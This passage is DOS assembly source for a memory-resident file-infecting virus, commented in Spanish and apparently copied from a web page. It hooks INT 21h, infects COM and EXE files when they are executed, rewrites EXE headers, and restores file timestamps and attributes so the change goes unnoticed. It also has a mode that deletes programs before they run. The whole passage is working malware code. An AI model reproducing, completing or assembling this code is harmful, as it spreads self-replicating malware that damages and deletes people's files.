; лл                                                                                          лл
; лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

int21h          proc    far
                pushf                                           ; salva los flags
                cmp     ah,0E0h                                 ; ФП si no es funcion E0 (virus ac)
                jnz     loc_8                                   ; Фй => loc_1extra (ve las otras)
                mov     ax,0300h                                ; ax = 0300 ("estoy", CF = 0 -OK-)
                popf                                            ; restaura los flags
                iret                                            ; y retorna
loc_8:          cmp     ah,0DDh                                 ; ФП si es funcion DD (sys infec)
                jz      funcDD_int21h                           ; Фй => mueve el huesped
                cmp     ah,0DEh                                 ; ФП funcion DE ? (limpiar huesped)
                jz      funcDE_int21h                           ; Фй => sacar virus de mem
                cmp     ax,4B00h                                ; ФП si es funcion 4B00 (exec)
                jnz     no_es_func_virus                        ;  Г => infectar
                jmp     infectar                                ; Фй
no_es_func_virus:
                popf                                            ; restaura los flags
                jmp     dword ptr cs:[offvie_int21h-offset start] ; ejecuta la vieja int 21h
funcDD_int21h:
                pop     ax                                      ; borra los flags (que guardЂ)
                pop     ax                                      ; borra el ip del llamador
                mov     ax,offset start                         ; ФП guarda la direccion donde
                mov     cs:[ip_funcDD-offset start],ax          ;  Г comienza el huesped
                pop     ax                                      ;  Г (luego de sacar el virus)
                mov     cs:[cs_funcDD-offset start],ax          ; Фй
                rep     movsb                                   ; borra el virus de memoria
                popf                                            ; borra los flags (del INT 21h)
                mov     ax,cs:[FCBini_funcDD-offset start]      ; ax = valor de FCB validos (DOS)
                jmp     dword ptr cs:[ip_funcDD-offset start]   ; RETORNA AL HUESPED
funcDE_int21h:
                add     sp,0006h                                ; borra flags (que salvo), ip y cs
                popf                                            ; saca los flags (al hacer INT 21)
                mov     ax,cs                                   ; ФП
                mov     ss,ax                                   ;  Г ss:sp = cs:stack de residente
                mov     sp,_tope_stack_xtr                      ; Фй
                push    es                                      ; salva es
                push    es                                      ; salva es
                xor     di,di                                   ; di = 0000
                push    cs                                      ; ФП cs = es
                pop     es                                      ; Фй
                mov     cx,length clean_parameter               ; cx = long del param para limpiar
                mov     si,bx                                   ; ds:si = puntero a la tb param
                mov     di,offset clean_parameter-offset start  ; es:di = puntero al buff de param
                rep     movsb                                   ; copia la tb de param para limpiar
                mov     ax,ds                                   ; ФП es = ds (del virus a remover)
                mov     es,ax                                   ; Фй
                mul     word ptr cs:[infec_longparag-offset start] ; dx.ax = nro de byte del virus
                add     ax,cs:[clean_parameter-offset start+0Ah] ; ФП dx.ax + long del virus
                adc     dx,0000h                                 ; Фй (comienzo del pgm infectado)
                div     word ptr cs:[infec_longparag-offset start] ; ax = seg pgm, dx = off pgm infec
                mov     ds,ax                                   ; ФП ds:si = ax:dx (bytes del pgm
                mov     si,dx                                   ; Фй                infectado)
                mov     di,dx                                   ; di = destino (long del virus
                                                                ;      (debe ser multiplo de 16 b)
                mov     bp,es                                   ; bp = es (aux para el seg)
                mov     bx,cs:[clean_parameter-offset start+0Eh] ; bx = # blks de 64 Kb a mover
                or      bx,bx                                   ; ФП si no hay uno completo
                jz      loc_11                                  ; Фй => loc_11 (mueve el fragmento)
loc_10:
                mov     cx,8000h                                ; ФП copia un bloque de 64 Kb
                rep     movsw                                   ; Фй
                add     ax,1000h                                ; ax + 64 Kb
                add     bp,1000h                                ; bp + 64 Kb
                mov     ds,ax                                   ; ds = seg del prox blk fuente
                mov     es,bp                                   ; es = seg del prox blk destino
                dec     bx                                      ; ФП si quedan bloques
                jnz     loc_10                                  ; Фй => loc_10 (itera)
loc_11:
                mov     cx,cs:[clean_parameter-offset start+0Ch] ; ФП copia el fragmento
                rep     movsb                                    ; Фй del final del huesped
                pop     ax                                      ; ФП ax = base segment del pgm
                push    ax                                      ;  Г      (debe reubicar el EXE)
                add     ax,0010h                                ; Фй
                add     cs:[clean_parameter-offset start+08h],ax ; ФП reubica el cs y ss del huesped
                add     cs:[clean_parameter-offset start+04h],ax ; Фй en el segmento base que tienen
                mov     ax,cs:[clean_parameter-offset start+00h] ; ax = drv specifiers (FCB valids)
                pop     ds                                      ; ФП ds = es = PSP
                pop     es                                      ; Фй
                mov     ss,cs:[clean_parameter-offset start+08h] ; ФП ss:sp = stack del huesped
                mov     sp,cs:[clean_parameter-offset start+06h] ; Фй
                jmp     dword ptr cs:[clean_parameter-offset start+02h] ; => salta al huesped
borrar_y_ejec:
                xor     cx,cx                                   ; ФП pone el archivo con
                mov     ax,4301h                                ;  Г atributos normales
                int     21h                                     ; Фй
                mov     ah,41h                                  ; ФП borra el archivo
                int     21h                                     ; Фй
                mov     ax,4B00h                                ; ax = cargar y ejecutar
                popf                                            ; saca los flags
                jmp     dword ptr cs:[offvie_int21h-offset start] ; salta a la int 21 vieja
infectar:
                cmp     byte ptr cs:[VIRUS_borrarpgm-offset start],01h ; ФП si debe borrar archs
                je      borrar_y_ejec                                  ; Фй => borra el arch y ejecuta
                mov     word ptr cs:[infec_fhandle-offset start],0FFFFh ; marca no hay arch abierto
                mov     word ptr cs:[infec_pidiomem-offset start],0000h ; marca no pidio memoria
                mov     cs:[infec_off_fname-offset start],dx    ; ФП guarda el puntero
                mov     cs:[infec_seg_fname-offset start],ds    ; Фй al fname a ejecutar
                push    ax                                      ; ФП
                push    bx                                      ;  Г
                push    cx                                      ;  Г salva
                push    dx                                      ;  Г los
                push    si                                      ;  Г registros
                push    di                                      ;  Г
                push    ds                                      ;  Г
                push    es                                      ; Фй
                cld                                             ; incrementa las direcciones
                mov     di,dx                                   ; di = dx (offset fname)
                xor     dl,dl                                   ; dl = 00
                cmp     byte ptr [di+1],3Ah                     ; ФП si no especifica 'd:'
                jne     loc_14                                  ; Фй => loc_14 (usar drive actual)
                mov     dl,[di]                                 ; ФП dl = # de drive indicado
                and     dl,1Fh                                  ; Фй
loc_14:
                mov     ah,36h                                  ; ФП obtiene el espacio libre
                int     21h                                     ; Фй del disco indicado (o actual)
                cmp     ax,0FFFFh                               ; ФП si ax <> FFFF (disco valido)
                jne     loc_16                                  ; Фй => loc_16 (va a infectar)
loc_15:
                jmp     loc_42                                  ; => vieja int 21
loc_16:
                mul     bx                                      ; ФП dx.ax = numero de bytes
                mul     cx                                      ; Фй         libres en el disco
                or      dx,dx                                   ; ФП
                jnz     loc_17                                  ;  Г si no hay lugar para
                cmp     ax,710h                                 ;  Г el virus => vieja int 21
                jb      loc_15                                  ; Фй
loc_17:
                mov     dx,cs:[infec_off_fname-offset start]    ; dx = off del fname
                push    ds                                      ; ФП es = ds
                pop     es                                      ; Фй
                xor     al,al                                   ; al = 00
                mov     cx,0041h                                ; cx = 65 (long max de fname)
                repne   scasb                                   ; busca el fin de cadena
                mov     si,cs:[infec_off_fname-offset start]    ; si = off del fname
loc_18:
                mov     al,[si]                                 ; al = sig caracter
                or      al,al                                   ; ФП si al = 00 (fin de cadena)
                jz      loc_20                                  ; Фй => loc_20
                cmp     al,'a'                                  ; ФП
                jb      loc_19                                  ;  Г pasa la letra
                cmp     al,'z'                                  ;  Г a mayuscula
                ja      loc_19                                  ;  Г
                sub     byte ptr [si],'a'-'A'                   ; Фй
loc_19:
                inc     si                                      ; si + 1 (sig caracter)
                jmp     short loc_18                            ; => loc_18 (itera)
loc_20:
                mov     cx,long_command                         ; ФП si - 11 (long 'COMMAND.COM')
                sub     si,cx                                   ; Фй
                mov     di,offset command-offset start          ; ФП es:di = 'COMMAND.COM'
                push    cs                                      ;  Г
                pop     es                                      ; Фй
                mov     cx,long_command                         ; cx = long 'COMMAND.COM'
                repe    cmpsb                                   ; ve si el arch es el COMMAND.COM
                jnz     loc_21                                  ; si no es => continua infeccion
                jmp     loc_42                                  ; si es => vieja int 21
loc_21:
                mov     ax,4300h                                ; ФП obtiene los atributos
                int     21h                                     ; Фй del archivo
                jc      loc_22                                  ; si CF = 1 (ERR) => loc_40 *******
                mov     cs:[infec_atrib-offset start],cx        ; salva el atributo actual del arch
loc_22:
                jc      loc_24                                  ; si CF = 1 (ERR) => loc_40 *******
                xor     al,al                                   ; al = 00 (valor para indicar COM)
                mov     cs:[infec_esCOM-offset start],al        ; asume que el pgm es COM
                push    ds                                      ; ФП
                pop     es                                      ;  Г es:dx = punt al fname
                mov     di,dx                                   ; Фй
                mov     cx,0041h                                ; cx = long maxima del fname
                repne   scasb                                   ; busca el fin de fname
                cmp     byte ptr [di-2],4Dh                     ; ФП
                je      loc_23                                  ;  Г si el arch a ejecutar es
                cmp     byte ptr [di-2],6Dh                     ;  Г com (o COM) => loc_23
                je      loc_23                                  ; Фй
                inc     byte ptr cs:[infec_esCOM-offset start]  ; indica que es EXE
loc_23:
                mov     ax,3D00h                                ; ФП abre el arch a ejecutar
                int     21h                                     ; Фй como read only
loc_24:
                jc      loc_26                                  ; si CF = 1 (ERR) => loc_40 (fin)
                mov     cs:[infec_fhandle-offset start],ax      ; salva el file handle
                mov     bx,ax                                   ; bx = file handle
                mov     ax,4202h                                ; ФП
                mov     cx,0FFFFh                               ;  Г se mueve 5 bytes
                mov     dx,0FFFBh                               ;  Г antes del EOF
                int     21h                                     ; Фй
                jc      loc_24                                  ; si CF = 1 (ERR) => loc_40 (fin)
                add     ax,0005h                                ; ФП ax + 5 (low byte of EOF)
                mov     cs:[long_huesped-offset start],ax       ; Фй guarda la long del huesped
                mov     cx,0005h                                ; ФП
                mov     dx,offset infec_buffvirid-offset start  ;  Г lee los ultimos 5 bytes
                mov     ax,cs                                   ;  Г del huesped
                mov     ds,ax                                   ;  Г en infect_buffvirid
                mov     es,ax                                   ;  Г (es = ds = cs)
                mov     ah,3Fh                                  ;  Г
                int     21h                                     ; Фй
                mov     di,dx                                   ; di = puntero a los 5 ult bytes
                mov     si,offset VIRUS_ID-offset start         ; si = puntero al VIRUS ID
                repe    cmpsb                                   ; compara los 5 bytes con el VIR ID
                jnz     loc_25                                  ; si no esta infectado => loc_25
                mov     ah,3Eh                                  ; ФП cierra el archivo
                int     21h                                     ; Фй (ya lo infecto)
                jmp     loc_42                                  ; => vieja int 21 (exec)
loc_25:
                mov     ax,3524h                                ; ФП obtiene el puntero
                int     21h                                     ; Фй de la int 24h
                mov     ds:[infec_offint24h-offset start],bx    ; ФП salva el
                mov     ds:[infec_segint24h-offset start],es    ; Фй puntero
                mov     dx,offset int24h-offset start           ; ds:dx = punt a la rut de int24
                mov     ax,2524h                                ; ФП pone el nuevo
                int     21h                                     ; Фй puntero de int 24
                lds     dx,dword ptr ds:[infec_off_fname-offset start] ; ФП pone el archivo
                xor     cx,cx                                          ;  Г como normal
                mov     ax,4301h                                       ;  Г (para poder leerlo)
                int     21h                                            ; Фй
loc_26:
                jc      loc_27                                  ; si CF = 1 (ERR) => loc_40 (fin)
                mov     bx,cs:[infec_fhandle-offset start]      ; ФП cierra el
                mov     ah,3Eh                                  ;  Г archivo
                int     21h                                     ; Фй
                mov     cs:[infec_fhandle-offset start],0FFFFh  ; pone fhandle = FFFF (no abierto)
                mov     ax,3D02h                                ; ФП abre el archivo
                int     21h                                     ; Фй como read/write
                jc      loc_27                                  ; si CF = 1 (ERR) => loc_27
                mov     cs:[infec_fhandle-offset start],ax      ; salva al file handle
                mov     ax,cs                                   ; ФП
                mov     ds,ax                                   ;  Г es = ds = cs
                mov     es,ax                                   ; Фй
                mov     bx,ds:[infec_fhandle-offset start]      ; bx = fhandle
                mov     ax,5700h                                ; ФП obtiene fecha y hora de
                int     21h                                     ; Фй creacion del archivo
                mov     ds:[infec_fdate-offset start],dx        ; ФП guarda la fecha
                mov     ds:[infec_ftime-offset start],cx        ; Фй y hora de creacion
                mov     ax,4200h                                ; ФП
                xor     cx,cx                                   ;  Г se mueve al comienzo
                mov     dx,cx                                   ;  Г del archivo
                int     21h                                     ; Фй
loc_27:
                jc      loc_30                                  ; si CF = 1 (ERR) => loc_40 (fin)
                cmp     byte ptr ds:[infec_esCOM-offset start],00h ; ФП si no es COM
                je      infec_COM                                  ;  Г => infecta un COM
                jmp     short infec_EXE                            ; Фй
                nop
infec_COM:
                mov     bx,1000h                                ; ФП pide 64 Kb de
                mov     ah,48h                                  ;  Г memoria (como
                int     21h                                     ; Фй buffer)
                jnc     loc_29                                  ; si CF = 0 (OK) => loc_29
                mov     ah,3Eh                                  ; ФП cierra el archivo
                mov     bx,ds:[infec_fhandle-offset start]      ;  Г (aborta la infeccion)
                int     21h                                     ; Фй
                jmp     loc_42                                  ; => vieja int 21 (exec)
loc_29:
                inc     word ptr ds:[infec_pidiomem-offset start] ; indica que pidio memoria
                mov     es,ax                                   ; es = ax (segmento del buffer)
                xor     si,si                                   ; si = 0000 (punt al buffer)
                mov     di,si                                   ; di = 0000 (punt al com del VIRUS)
                mov     cx,long_virus                           ; cx = longitud del virus
                rep     movsb                                   ; copia el virus al buffer
                mov     dx,di                                   ; ФП
                mov     cx,ds:[long_huesped-offset start]       ;  Г
                mov     bx,ds:[infec_fhandle-offset start]      ;  Г copia el huesped en el
                push    es                                      ;  Г resto del buffer
                pop     ds                                      ;  Г
                mov     ah,3Fh                                  ;  Г
                int     21h                                     ; Фй
loc_30:
                jc      loc_31                                  ; si CF = 1 (ERR) => loc_40 (fin)
                add     di,cx                                   ; di + cx (primer byte free en buf)
                xor     cx,cx                                   ; ФП
                mov     dx,cx                                   ;  Г se mueve al comienzo
                mov     ax,4200h                                ;  Г del archivo
                int     21h                                     ; Фй
                mov     si,offset VIRUS_ID-offset start         ; ФП copia el VIRUS ID
                mov     cx,long_VIRUS_ID                        ;  Г al final del buffer
                db      0F3h, 2Eh, 0A4h                         ;  Г (estos bytes equivalen
                                                                ; Фй  a REPZ  CS:MOVSB)
                mov     cx,di                                   ; ФП
                xor     dx,dx                                   ;  Г copia el buffer
                mov     ah,40h                                  ;  Г al archivo
                int     21h                                     ; Фй
loc_31:
                jc      loc_33                                  ; ФП => loc_40 (finaliza, restaura
                jmp     loc_40                                  ; Фй    mem, cierra archs, etc.)
infec_EXE:
                mov     cx,long_header                          ; ФП
                mov     dx,offset infec_EXEhead-offset start    ;  Г lee el header del EXE
                mov     ah,3Fh                                  ;  Г en infec_EXEhead
                int     21h                                     ; Фй
loc_33:
                jc      loc_35                                  ; si CF = 1 (ERR) => loc_40 (fin)
                mov     ds:[infec_EXEhead-offset start+12h],1984h ; pone como checksum 1984
                mov     ax,ds:[infec_EXEhead-offset start+0Eh]  ; ФП
                mov     ds:[infec_ssEXEhead-offset start],ax    ;  Г pone el ss:sp del EXE
                mov     ax,ds:[infec_EXEhead-offset start+10h]  ;  Г en infec_spEXEheader
                mov     ds:[infec_spEXEhead-offset start],ax    ; Фй
                mov     ax,ds:[infec_EXEhead-offset start+14h]  ; ФП
                mov     ds:[infec_ipEXEhead-offset start],ax    ;  Г pone el cs:ip del EXE
                mov     ax,ds:[infec_EXEhead-offset start+16h]  ;  Г en infec_ipEXEheader
                mov     ds:[infec_csEXEhead-offset start],ax    ; Фй
                mov     ax,ds:[infec_EXEhead-offset start+04h]  ; ax = # de pags de 512 bs del arch
                cmp     word ptr ds:[infec_EXEhead-offset start+02h],0000h ; ФП si la ultima pag esta llena
                je      loc_34                                             ; Фй => loc_34
                dec     ax                                      ; ax - 1 (hay una pag complt menos)
loc_34:
                mul     word ptr ds:[infec_longpag-offset start] ; ФП
                add     ax,ds:[infec_EXEhead-offset start+02h]   ;  Г
                adc     dx,0000h                                 ;  Г dx.ax = long en bytes
                add     ax,000Fh                                 ;  Г         del arch redondeada
                adc     dx,0000h                                 ;  Г         a multiplo de 16
                and     ax,0FFF0h                                ; Фй
                mov     word ptr ds:[infec_longEXE-offset start],ax   ; ФП guarda la longitud
                mov     word ptr ds:[infec_longEXE+2-offset start],dx ; Фй real del EXE
                add     ax,long_virus                           ; ФП le suma la long
                adc     dx,0000h                                ; Фй del VIRUS
loc_35:
                jc      loc_37                                  ; si CF = 1 ( > 4Gb) => loc_40 (fin)
                div     word ptr ds:[infec_longpag-offset start] ; calcula la cant de paginas
                or      dx,dx                                   ; ФП si se completo la ult pagina
                jz      loc_36                                  ; Фй => loc_36
                inc     ax                                      ; ax + 1 (1 pag mas)
loc_36:
                mov     ds:[infec_EXEhead-offset start+04h],ax  ; pone la long en pag del arch
                mov     ds:[infec_EXEhead-offset start+02h],dx  ; pone la long del arch mod 512
                mov     ax,word ptr ds:[infec_longEXE-offset start]   ; ФП dx.ax = longitud real del EXE
                mov     dx,word ptr ds:[infec_longEXE+2-offset start] ; Фй
                div     word ptr ds:[infec_longparag-offset start] ; ax = cantidad de parag del EXE
                sub     ax,ds:[infec_EXEhead-offset start+08h]  ; ax - long del header en parag
                mov     ds:[infec_EXEhead-offset start+16h],ax                                 ; ФП pone cs:ip del header
                mov     word ptr ds:[infec_EXEhead-offset start+14h],offset VIRUS-offset start ; Фй al final del EXE
                mov     ds:[infec_EXEhead-offset start+0Eh],ax              ; ФП pone ss:sp del head
                mov     ds:[infec_EXEhead-offset start+10h],_tope_stack_xtr ; Фй al final del EXE
                xor     cx,cx                                   ; ФП
                mov     dx,cx                                   ;  Г se mueve al comienzo
                mov     ax,4200h                                ;  Г del archivo
                int     21h                                     ; Фй
loc_37:
                jc      loc_38                                  ; si CF = 1 (ERR) => loc_40 (fin)
                mov     cx,long_header                          ; ФП
                mov     dx,offset infec_EXEhead-offset start    ;  Г graba el header
                mov     ah,40h                                  ;  Г del EXE
                int     21h                                     ; Фй
loc_38:
                jc      loc_39                                  ; si CF = 1 (ERR) => loc_40 (fin)
                cmp     ax,cx                                   ; ФП si no grabo todo el header
                jne     loc_40                                  ; Фй => loc_40 (fin)
                mov     dx,word ptr ds:[infec_longEXE-offset start]    ; ФП
                mov     cx,word ptr ds:[infec_longEXE+2-offset start]  ;  Г se mueve al final
                mov     ax,4200h                                       ;  Г del archivo
                int     21h                                            ; Фй
loc_39:
                jc      loc_40                                  ; si CF = 1 (ERR) => loc_40 (fin)
                xor     dx,dx                                   ; ФП
                mov     cx,long_virus                           ;  Г graba el virus al
                mov     ah,40h                                  ;  Г final del archivo
                int     21h                                     ; Фй
loc_40:
                cmp     word ptr cs:[infec_pidiomem-offset start],0000h ; ФП si no pidio memoria
                je      loc_41                                          ; Фй => loc_41
                mov     ah,49h                                  ; ФП libera la mem
                int     21h                                     ; Фй que pidio
loc_41:
                cmp     cs:[infec_fhandle-offset start],0FFFFh  ; ФП si no hay un fhandle valido
                je      loc_42                                  ; Фй => loc_42 (vieja int 21)
                mov     bx,cs:[infec_fhandle-offset start]      ; ФП
                mov     dx,cs:[infec_fdate-offset start]        ;  Г setea la fecha y hora
                mov     cx,cs:[infec_ftime-offset start]        ;  Г de creacion del archivo
                mov     ax,5701h                                ;  Г
                int     21h                                     ; Фй
                mov     ah,3Eh                                  ; ФП cierra el archivo
                int     21h                                     ; Фй
                lds     dx,dword ptr cs:[infec_off_fname-offset start] ; ФП
                mov     cx,cs:[infec_atrib-offset start]               ;  Г restaura los atributos
                mov     ax,4301h                                       ;  Г del archivo
                int     21h                                            ; Фй
                lds     dx,dword ptr cs:[infec_offint24h-offset start] ; ФП
                mov     ax,2524h                                       ;  Г restaura la vieja int 24
                int     21h                                            ; Фй
loc_42:
                pop     es                                      ; ФП
                pop     ds                                      ;  Г
                pop     di                                      ;  Г restaura
                pop     si                                      ;  Г los
                pop     dx                                      ;  Г registros
                pop     cx                                      ;  Г
                pop     bx                                      ;  Г
                pop     ax                                      ; Фй
                popf                                            ; restaura los flags
                jmp     dword ptr cs:[offvie_int21h-offset start] ; salta a la vieja int 21
int21h          endp


                align   16                                      ; continua en el sig paragraph

_stack          db      100h dup (00h)                          ; stack del virus (es de 100h bytes)

_stack_extra    db      10h dup (00h)                           ; stack cuando esta residente

; лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
; лл                                                                                          лл
; лл                     programa huesped (infectado)                                         лл
; лл                                                                                          лл
; лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

                org     0810h

inicio_huesped: mov     ax,4C00h                                ; ФП el huesped es ficticio
                int     21h                                     ; Фй (solo termina)

; лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
; лл                                                                                          лл
; лл                     VIRUS ID (el pgm ya esta infectado)                                  лл
; лл                                                                                          лл
; лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

HUESPED_INFEC   db      'MsDos'                                 ; seЄal para generar un original infectado


_codeseg        ends
                end     start

</textarea></td></tr></table></body></html>
